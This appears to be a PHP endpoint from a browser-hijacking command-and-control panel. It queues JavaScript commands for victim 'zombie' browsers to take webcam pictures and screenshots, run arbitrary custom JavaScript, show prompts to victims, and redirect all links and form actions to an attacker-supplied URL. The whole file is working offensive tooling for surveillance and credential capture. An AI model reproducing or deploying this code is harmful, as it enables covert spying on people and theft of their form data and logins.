<?php
/*
Page: Ajax Command Creater
*/
require_once('../includes/functions.php');
require_once('../includes/javascript_generator.php');

if(isset($_POST['create_webcam_command'])) {
	$uid = $_POST['uid'];
	$zid = $_POST['zid'];
	$webcamjavascript = generate_picture_js($uid, $zid);
	if(create_zombie_command($uid, $zid, $webcamjavascript)) {
		create_zombie_log($uid, $zid, "Take Picture", "Pending Response");
		echo "1";
	} else {
		create_zombie_log($uid, $zid, "Take Picture", "Create Command Failed :(");
	}
}

if(isset($_POST['create_screenshot_command'])) {
	$uid = $_POST['uid'];
	$zid = $_POST['zid'];
	$screenshotjavascript = generate_screenshot_js($uid, $zid);
	if(create_zombie_command($uid, $zid, $screenshotjavascript)) {
		create_zombie_log($uid, $zid, "Take Screenshot", "Pending Response");
		echo "1";
	} else {
		create_zombie_log($uid, $zid, "Take Screenshot", "Create Command Failed :(");
	}
}

if(isset($_POST['execute_custom_js'])) {
	$uid = $_POST['uid'];
	$zid = $_POST['zid'];
	$javascriptcode = $_POST['custom_js'];
	if(create_zombie_command($uid, $zid, $javascriptcode)) {
		$modalstring = "<a onclick=\"generate_modal('Custom Javascript', '".addslashes(htmlspecialchars($javascriptcode))."', 'Close', 'return false;');\">View JS</a>";
		create_zombie_log($uid, $zid, $modalstring, "Executed");
		echo "1";
	} else {
		create_zombie_log($uid, $zid, "Execute Custom Javascript", "Create Command Failed :(");
	}
}

if(isset($_POST['prompt_zombie'])) {
	$uid = $_POST['uid'];
	$zid = $_POST['zid'];
	$prompttext = $_POST['prompt_text'];
	$promptjavascript = generate_prompt_js($prompttext, $uid, $zid);
	if(create_zombie_command($uid, $zid, $promptjavascript)) {
		$modalstring = "<a onclick=\"generate_modal('Zombie Prompt Text', '".addslashes(htmlspecialchars($prompttext))."', 'Close', 'return false;');\">View Prompt Text</a>";
		create_zombie_log($uid, $zid, $modalstring, "Zombie Prompted");
		echo "1";
	} else {
		create_zombie_log($uid, $zid, "Prompt Zombie", "Create Command Failed :(");
	}
}

if(isset($_POST['replace_all_links'])) {
	$uid = $_POST['uid'];
	$zid = $_POST['zid'];
	$replaceurl = $_POST['link_location'];
	$replacelinksjavascript = generate_replace_links_js($uid, $zid, $replaceurl);
	if(create_zombie_command($uid, $zid, $replacelinksjavascript)) {
		create_zombie_log($uid, $zid, "Replace All Link Locations", "Command Sent");
		echo "1";
	} else {
		create_zombie_log($uid, $zid, "Replace All Link Locations", "Create Command Failed :(");
	}
}

if(isset($_POST['replace_all_form_actions'])) {
	$uid = $_POST['uid'];
	$zid = $_POST['zid'];
	$replaceurl = $_POST['link_location'];
	$replaceformactionjavascript = generate_replace_form_action_js($uid, $zid, $replaceurl);
	if(create_zombie_command($uid, $zid, $replaceformactionjavascript)) {
		create_zombie_log($uid, $zid, "Replace All Form Action Locations", "Command Sent");
		echo "1";
	} else {
		create_zombie_log($uid, $zid, "Replace All Form Action Locations", "Create Command Failed :(");
	}
}
?>